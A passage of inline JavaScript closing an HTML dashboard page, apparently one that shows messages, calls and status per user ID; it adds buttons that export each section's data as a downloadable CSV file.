            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", filename);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
        }

        exportButtons.forEach(button => {
            button.addEventListener('click', () => {
                const sectionKey = button.dataset.section; // e.g., "messages", "calls"
                let dataToExport;

                if (sectionKey === "overview") {
                    // Overview export needs to combine alias and status
                    const aliasData = currentDataForExport['overview_alias'] || [];
                    const statusData = currentDataForExport['overview_status'] || [];
                    dataToExport = [{ // Combine into one object for one row CSV
                        Alias: aliasData[0]?.Alias || '',
                        LastSeen: statusData[0]?.LastSeen || '',
                        Status: statusData[0]?.Status || ''
                    }];
                } else {
                   dataToExport = currentDataForExport[sectionKey];
                }
                
                if (dataToExport && dataToExport.length > 0) {
                    const filename = `${currentUid}_${sectionKey}_export.csv`;
                    exportToCsv(filename, dataToExport);
                } else {
                    alert(`No data available to export for ${sectionKey}.`);
                }
            });
        });

        // Initial setup on script load
        // Auth state change will trigger dashboard loading or show login page.
    </script>
</body>
</html>